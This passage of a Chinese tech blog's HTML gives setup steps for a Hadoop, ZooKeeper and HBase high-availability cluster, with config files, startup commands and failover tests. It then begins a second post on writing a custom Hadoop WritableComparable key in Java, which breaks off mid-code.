&lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- 指定zookeeper集群机器 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.zk-address&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188:2181,master189:2181,slave190:2181&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- NodeManager上运行的附属服务，默认是mapreduce_shuffle --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;mapreduce_shuffle&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h5 id="6）vi-slaves"><a href="#6）vi-slaves" class="headerlink" title="6）vi slaves"></a>6）vi slaves</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">master188</span><br><span class="line">master189</span><br><span class="line">slave190</span><br></pre></td></tr></table></figure>
<h4 id="3、拷贝hadoop到其他机器"><a href="#3、拷贝hadoop到其他机器" class="headerlink" title="3、拷贝hadoop到其他机器"></a>3、拷贝hadoop到其他机器</h4><h5 id="1）拷贝"><a href="#1）拷贝" class="headerlink" title="1）拷贝"></a>1）拷贝</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -r hadoop-2.6.5 hadoop@master189:/home/hadoop/</span><br><span class="line"></span><br><span class="line">scp -r hadoop-2.6.5 hadoop@slave190:/home/hadoop/</span><br></pre></td></tr></table></figure>
<h5 id="2）修改yarn-site-xml"><a href="#2）修改yarn-site-xml" class="headerlink" title="2）修改yarn-site.xml"></a>2）修改yarn-site.xml</h5><p>在master189机器，即ResourceManager备用主节点上修改如下属性，表示当前机器作为rm2:：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;yarn.resourcemanager.ha.id&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;rm2&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>
<p>同时删除slave190机器上的该属性对，因为slave190机器并不作为ResourceManager。</p>
<h4 id="3、启动Hadoop"><a href="#3、启动Hadoop" class="headerlink" title="3、启动Hadoop"></a>3、启动Hadoop</h4><h5 id="1-启动Journalnode"><a href="#1-启动Journalnode" class="headerlink" title="1)启动Journalnode"></a>1)启动Journalnode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/sbin/</span><br><span class="line"></span><br><span class="line">./hadoop-daemon.sh start </span><br><span class="line"></span><br><span class="line">//查看进程JouralNode是否启动</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<h5 id="2）格式化-NameNode和ZKFC"><a href="#2）格式化-NameNode和ZKFC" class="headerlink" title="2）格式化 NameNode和ZKFC"></a>2）格式化 NameNode和ZKFC</h5><p>在master188机器上，执行格式化操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/bin</span><br><span class="line"></span><br><span class="line">./hdfs namenode -format</span><br><span class="line"></span><br><span class="line">./hdfs zkfc -formatZK</span><br></pre></td></tr></table></figure>
<h5 id="3）备用主节点同步主节点元数据"><a href="#3）备用主节点同步主节点元数据" class="headerlink" title="3）备用主节点同步主节点元数据"></a>3）备用主节点同步主节点元数据</h5><p>在master189（备用主节点）机器上，执行同步操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/bin</span><br><span class="line"></span><br><span class="line">./hdfs namenode -bootstrapStanby</span><br></pre></td></tr></table></figure>
<h5 id="4）安装fuster"><a href="#4）安装fuster" class="headerlink" title="4）安装fuster"></a>4）安装fuster</h5><p>若服务器是最小化安装centeros时，有可能系统没有fuster程序，那么跳过这个安装步骤直接进行后面的操作时，将有可能出现以下问题：</p>
<blockquote>
<p>master188作为主节点时，kill掉master188上的NameNode和ResourceManager进程时，可以实现故障转移，master189将从stanby状态自动变成active状态；但是当master189作为主节点时，若kill掉master189上的进程，master188上的进程状态却还是stanby，并不能实现故障自动转移。原因是我们在 hdfs-site.xml中配置了当集群需要故障自动转移时采用SSH方式进行，而因为缺少fuster程序，将在zkfc的日志文件中发现如下错误：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PATH=$PATH:/sbin:/usr/sbin fuser -v -k -n tcp 9000 via ssh: bash: fuser: 未找到命令</span><br><span class="line">Unable to fence service by any configured method</span><br><span class="line">java.lang.RuntimeException: Unable to fence NameNode at master189/192.168.29.189:9000</span><br></pre></td></tr></table></figure>
<p>提示未找到fuster程序，导致无法进行fence，所以可以通过如下命令来安装，Psmisc软件包中包含了fuster程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//分别在master188、master189、slave190上执行</span><br><span class="line">sudo yum install psmisc</span><br></pre></td></tr></table></figure>
<h5 id="5）启动HDFS、YARN、ZookeeperFailoverController"><a href="#5）启动HDFS、YARN、ZookeeperFailoverController" class="headerlink" title="5）启动HDFS、YARN、ZookeeperFailoverController"></a>5）启动HDFS、YARN、ZookeeperFailoverController</h5><p>在master188机器上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/sbin</span><br><span class="line"></span><br><span class="line">./start-dfs.sh</span><br><span class="line"></span><br><span class="line">//验证，显示NameNode和DataNode</span><br><span class="line">jps</span><br><span class="line"></span><br><span class="line">./start-yarn.sh</span><br><span class="line"></span><br><span class="line">//验证，显示ResourceManager和NodeManager</span><br><span class="line">jps</span><br><span class="line"></span><br><span class="line">./hadoop-daemon.sh start zkfc</span><br><span class="line"></span><br><span class="line">//验证，显示ZookeeperFailoverController</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<p>在master189机器上，启动ResourceManager，备用主节点的ResourceManager需要手动启动：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/sbin</span><br><span class="line"></span><br><span class="line">yarn-daemon.sh start resourcemanager</span><br></pre></td></tr></table></figure>
<h5 id="6）查看Namenode、ResourceManager状态"><a href="#6）查看Namenode、ResourceManager状态" class="headerlink" title="6）查看Namenode、ResourceManager状态"></a>6）查看Namenode、ResourceManager状态</h5><p>在master188机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hdfs haadmin -getServiceState master188</span><br><span class="line">yarn rmadmin -getServiceState rm1 </span><br><span class="line"></span><br><span class="line">hdfs haadmin -getServiceState master189</span><br><span class="line">yarn rmadmin -getServiceState rm2</span><br></pre></td></tr></table></figure>
<p>也可以通过Web界面来查看，浏览器中输入 ip:50070 查看HDFS，输入 ip:8088/cluster/cluster 查看YARN。</p>
<h5 id="7）测试高可用"><a href="#7）测试高可用" class="headerlink" title="7）测试高可用"></a>7）测试高可用</h5><h6 id="a-主节点—-gt-备用主节点"><a href="#a-主节点—-gt-备用主节点" class="headerlink" title="a.主节点—&gt;备用主节点"></a>a.主节点—&gt;备用主节点</h6><p>kill掉主节点的namenode，查看备用主节点的namenode状态是否切换为active；</p>
<p>kill掉主节点的ResourceManager，查看备用主节点的ResourceManager是否切换为active；</p>
<h6 id="b-备用主节点—-gt-主节点"><a href="#b-备用主节点—-gt-主节点" class="headerlink" title="b.备用主节点—&gt;主节点"></a>b.备用主节点—&gt;主节点</h6><p>若上述操作执行成功，那么再测试反向故障自动转移</p>
<p>先启动被杀死的原主节点的namenode和ResourceManager</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hadoop-daemon.sh start namenode </span><br><span class="line"></span><br><span class="line">yarn-daemon.sh start resourcemanager</span><br></pre></td></tr></table></figure>
<p>再kill备用主节点的namenode和ResourceManager，查看主节点的状态，若能切换为active，那么Hadoop HA高可用集群搭建完成。</p>
<h3 id="五、安装配置HBase"><a href="#五、安装配置HBase" class="headerlink" title="五、安装配置HBase"></a>五、安装配置HBase</h3><h4 id="1、下载及安装-2"><a href="#1、下载及安装-2" class="headerlink" title="1、下载及安装"></a>1、下载及安装</h4><p>下载地址：<a href="http://mirrors.hust.edu.cn/apache/hbase/1.3.1/hbase-1.3.1-bin.tar.gz" target="_blank" rel="noopener">http://mirrors.hust.edu.cn/ap…</a></p>
<p>在master188机器上，解压到/home/hadoop/目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf hbase-1.3.1-bin.tar.gz</span><br></pre></td></tr></table></figure>
<h4 id="2、配置-1"><a href="#2、配置-1" class="headerlink" title="2、配置"></a>2、配置</h4><p>进入hbase-1.3.1/conf/目录，修改配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd hbase-1.3.1/conf/</span><br></pre></td></tr></table></figure>
<h5 id="1）vi-hbase-env-sh"><a href="#1）vi-hbase-env-sh" class="headerlink" title="1）vi hbase-env.sh"></a>1）vi hbase-env.sh</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//配置JDK</span><br><span class="line">export JAVA_HOME=/opt/jdk</span><br><span class="line"></span><br><span class="line">//保存pid文件</span><br><span class="line">export HBASE_PID_DIR=/home/hadoop/data/hbase/pids</span><br><span class="line"></span><br><span class="line">//修改HBASE_MANAGES_ZK，禁用HBase自带的Zookeeper，因为我们是使用独立的Zookeeper</span><br><span class="line">export HBASE_MANAGES_ZK=false</span><br></pre></td></tr></table></figure>
<h5 id="2）vi-hbase-site-xml"><a href="#2）vi-hbase-site-xml" class="headerlink" title="2）vi hbase-site.xml"></a>2）vi hbase-site.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;!-- 设置HRegionServers共享目录，请加上端口号 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.rootdir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hdfs://master/hbase&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;一定要把hadoop中的core-site.xml和hdf-site.xml复制到hbase的conf目录下，才能成功解析该集群名称；如果是hadoop单namenode集群，配置写成hdfs://master:9000/hbase (master是namenode主机名)&lt;/description&gt; </span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定HMaster主机 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.master&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hdfs://master188:60000&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 启用分布式模式 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.cluster.distributed&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定Zookeeper集群位置 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188:2181,master189:2181,slave190:2181&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定独立Zookeeper安装路径 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;/home/hadoop/zookeeper-3.4.11&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定ZooKeeper集群端口 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.zookeeper.property.clientPort&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;2181&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h5 id="3）vi-regionservers"><a href="#3）vi-regionservers" class="headerlink" title="3）vi regionservers"></a>3）vi regionservers</h5><p>修改regionservers文件，因为当前是使用独立的Zookeeper集群，所以要指定RegionServers所在机器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">master188</span><br><span class="line">master189</span><br><span class="line">slave190</span><br></pre></td></tr></table></figure>
<h4 id="4-backup-masters"><a href="#4-backup-masters" class="headerlink" title="4)backup-masters"></a>4)backup-masters</h4><p>vim backup-masters</p>
<p>hadoop2</p>
<h5 id="5-将hadoop的core-site-xml、hdfs-site-xml拷贝到hbase-conf下"><a href="#5-将hadoop的core-site-xml、hdfs-site-xml拷贝到hbase-conf下" class="headerlink" title="5)将hadoop的core-site.xml、hdfs-site.xml拷贝到hbase/conf下"></a>5)将hadoop的core-site.xml、hdfs-site.xml拷贝到hbase/conf下</h5><h5 id="6）创建pid文件保存目录"><a href="#6）创建pid文件保存目录" class="headerlink" title="6）创建pid文件保存目录"></a>6）创建pid文件保存目录</h5><p>在/home/hadoop/目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir data/hbase/pids -p</span><br></pre></td></tr></table></figure>
<h4 id="3、拷贝HBase到其他机器"><a href="#3、拷贝HBase到其他机器" class="headerlink" title="3、拷贝HBase到其他机器"></a>3、拷贝HBase到其他机器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /home/hadoop/</span><br><span class="line"></span><br><span class="line">scp -r hbase-1.3.1 hadoop@master189:/home/hadoop/</span><br><span class="line"></span><br><span class="line">scp -r hbase-1.3.1 hadoop@slave190:/home/hadoop/</span><br></pre></td></tr></table></figure>
<h4 id="4、启动HBase"><a href="#4、启动HBase" class="headerlink" title="4、启动HBase"></a>4、启动HBase</h4><p>在主节点上启动HBase（这里的主节点是指NameNode状态为active的节点，而非指文中对本实验的机器声明）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd hbase-1.3.1/bin</span><br><span class="line"></span><br><span class="line">./start-hbase.sh</span><br><span class="line"></span><br><span class="line">//查看HMaster、Regionserver进程是否启动</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：此时Hadoop集群应处于启动状态，并且是在主节点执行start-hbase.sh启动HBase集群，否则HMaster进程将在启动几秒后消失，而备用的HMaster进程需要在备用主节点单独启动，命令是：<code>./hbase-daemon.sh start master</code>。</p>
</blockquote>
<p>在备用主节点启动HMaster进程，作为备用HMaster：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hbase-1.3.1/bin</span><br><span class="line"></span><br><span class="line">./hbase-daemon.sh start master</span><br></pre></td></tr></table></figure>
<h4 id="5、HA高可用测试"><a href="#5、HA高可用测试" class="headerlink" title="5、HA高可用测试"></a>5、HA高可用测试</h4><p>在浏览器中输入 <code>ip:16010</code> ，查看主节点和备用主节点上的HMaster的状态，在备用主节点的web界面中，可以看到“Current Active Master: master188”，表示当前HBase主节点是master188机器；</p>
<h5 id="主节点—-gt-备用主节点"><a href="#主节点—-gt-备用主节点" class="headerlink" title="主节点—&gt;备用主节点"></a>主节点—&gt;备用主节点</h5><blockquote>
<p>这里的主节点指使用start-hbase.sh命令启动HBase集群的机器</p>
</blockquote>
<p>kill掉主节点的HMaster进程，在浏览器中查看备用主节点的HBase是否切换为active；</p>
<p>若上述操作成功，则在主节点启动被杀死的HMaster进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hbase-1.3.1/bin/</span><br><span class="line"></span><br><span class="line">./hbase-daemon.sh start master</span><br></pre></td></tr></table></figure>
<p>然后，kill掉备用主节点的HMaster进程，在浏览器中查看主节点的HBase是否切换为active，若操作成功，则HBase高可用集群搭建完成；</p>
<h4 id="6、HBase基本操作"><a href="#6、HBase基本操作" class="headerlink" title="6、HBase基本操作"></a>6、HBase基本操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//启动HBase</span><br><span class="line">[root@vnet ~] start-hbase.sh</span><br><span class="line"></span><br><span class="line">//进入HBase Shell</span><br><span class="line">[root@vnet ~] hbase shell</span><br><span class="line"></span><br><span class="line">//查看当前HBase有哪些表</span><br><span class="line">hbase(main):&gt; list</span><br><span class="line"></span><br><span class="line">//创建表t_user，cf1和cf2是列族，列族一般不超过3个</span><br><span class="line">hbase(main):&gt; create &apos;t_user&apos;,&apos;cf1&apos;,&apos;cf2&apos;</span><br><span class="line"></span><br><span class="line">//获得表t_user的描述信息</span><br><span class="line">hbase(main):&gt; describe &apos;t_user&apos;</span><br><span class="line"></span><br><span class="line">//禁用表</span><br><span class="line">hbase(main):&gt; disable &apos;t_user&apos;</span><br><span class="line"></span><br><span class="line">//删除表，删除表之前要先把表禁用掉</span><br><span class="line">hbase(main):&gt; drop &apos;t_user&apos;</span><br><span class="line"></span><br><span class="line">//查询表是否存在</span><br><span class="line">hbase(main):&gt; exists &apos;t_user&apos;</span><br></pre></td></tr></table></figure>
<h3 id="六、集群启动结果"><a href="#六、集群启动结果" class="headerlink" title="六、集群启动结果"></a>六、集群启动结果</h3><p>Hadoop + Zookeeper + HBase 高可用集群启动后，进程状态如下：</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>master188</th>
<th>master189</th>
<th>slave190</th>
</tr>
</thead>
<tbody>
<tr>
<td>HDFS主</td>
<td>NameNode</td>
<td>NameNode</td>
<td></td>
</tr>
<tr>
<td>HDFS从</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN主</td>
<td>ResourceManager</td>
<td>ResourceManager</td>
<td></td>
</tr>
<tr>
<td>YARN从</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
<tr>
<td>HBase主</td>
<td>HMaster</td>
<td>HMaster</td>
<td></td>
</tr>
<tr>
<td>HBase从</td>
<td>HRegionServer</td>
<td>HRegionServer</td>
<td>HRegionServer</td>
</tr>
<tr>
<td>Zookeeper独立进程</td>
<td>QuorumPeerMain</td>
<td>QuorumPeerMain</td>
<td>QuorumPeerMain</td>
</tr>
<tr>
<td>NameNodes数据同步</td>
<td>JournalNode</td>
<td>JournalNode</td>
<td>JournalNode</td>
</tr>
<tr>
<td>主备故障切换</td>
<td>DFSZKFailoverController</td>
<td>DFSZKFailoverController</td>
</tr>
</tbody>
</table>
<h3 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h3><p>需要注意的地方：</p>
<blockquote>
<p>1）备用节点上的NameNode、ResourceManager、HMaster均需单独启动；</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hadoop-daemon.sh start namenode</span><br><span class="line"></span><br><span class="line">yarn-daemon.sh start resourcemanager</span><br><span class="line"></span><br><span class="line">hbase-daemon.sh start master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>2）可以使用-forcemanual参数强制切换主节点与备用主节点，但强制切换后集群的自动故障转移将会失效，需要重新格式化zkfc：<code>hdfs zdfc -formatZK</code>;</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdfs haadmin -transitionToActive/transitionToStandby  -forcemanual  master189</span><br><span class="line">yarn rmadmin -transitionToActive/transitionToStandby  -forcemanual  rm2</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3）在备用主节点同步主节点的元数据时，主节点的HDFS必须已经启动；</p>
<p>4）无法查看standby状态的节点上的hdfs；</p>
<p>5）格式化namenode时要先启动各个JournalNode机器上的journalnode进程：<code>hadoop-daemon.sh start journalnode</code>；</p>
<p>6）若遇到问题，可以先考虑是哪个组件出现问题，然后查看该组件或与该组件相关的组件的日志信息；若各组件web页面无法访问，或存在其他连接问题，可以从「防火墙是否关闭」、「端口是否被占用」、「SSH」、「集群机器是否处于同一网段」内等角度考虑；</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/9-hadoop自定义Key注意事项/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/9-hadoop自定义Key注意事项/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ol>
<li>必须有一个无参的构造函数。</li>
<li>必须重写WritableComparable接口的hashCode()方法和equals()方法以及compareTo()方法。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wyg.course2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Writable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.WritableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInput;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- DESCRIPTION:</span></span><br><span class="line"><span class="comment">- 自定义Key</span></span><br><span class="line"><span class="comment">- 必须有一个无参的构造函数。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">- 必须重写WritableComparable接口的hashCode()方法和equals()方法以及compareTo()方法。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">- <span class="doctag">@author</span> wyg0405@gmail.com</span></span><br><span class="line"><span class="comment">- <span class="doctag">@create</span> 2019-02-12 21:39</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseEntity</span> <span class="keyword">implements</span> <span class="title">WritableComparable</span>&lt;<span class="title">CourseEntity</span>&gt; </span>&#123;</span><br><span class="line">​    <span class="keyword">private</span> String course;</span><br><span class="line">​    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="title">CourseEntity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span 